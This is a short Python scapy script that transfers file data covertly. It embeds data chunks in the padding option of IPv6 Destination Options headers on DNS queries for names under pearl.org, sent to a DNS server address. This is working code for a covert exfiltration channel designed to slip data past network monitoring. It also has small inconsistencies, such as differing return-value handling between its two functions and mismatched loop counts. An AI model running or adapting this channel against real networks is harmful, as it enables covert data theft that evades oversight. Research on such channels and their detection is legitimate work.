import getinfo
from scapy.all import *
def generate_send(filename, cw_list, data_cnt, last):
    dnsIP = getinfo.dst_addrs()
    fqdn_front = filename + '.' + str(data_cnt) + '.'
    fqdn_last = '.' + str(last) + '.pearl.org'
    print("FQDN --> {}<data_index>{}".format(fqdn_front, fqdn_last))
    for data_index in range(data_cnt):
        for slice in range(16):
            whois = fqdn_front + str(data_index) + fqdn_last
            pkt = IPv6(dst=dnsIP)/ \
                  IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cw_list[data_index][slice]))/ \
                  UDP(dport=53)/ \
                  DNS(id=slice, qd=DNSQR(qname=whois, qtype="A"))
            send(pkt, verbose=0)
            print("Transfer progress: packet index [{}]".format(data_index * 16 + slice), end = '\r')
    return True

def pkt_loss_send(filename, cwlist, cw_cnt, last):
    dnsMAC, dnsIP = getinfo.dst_addrs()
    whohas_pre = filename + '.' + str(cw_cnt) + '.'
    for cw in range(cw_cnt):
        for i in range(15):
            whohas = whohas_pre + str(cw) + '.' + str(last) + '.pearl.org'
            pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cwlist[cw][i]))/UDP(dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
            send(pkt, verbose=0)
            print("Packets sended: index [{}]".format(cw * 16 + i), end = '\r')
    return cw_cnt*15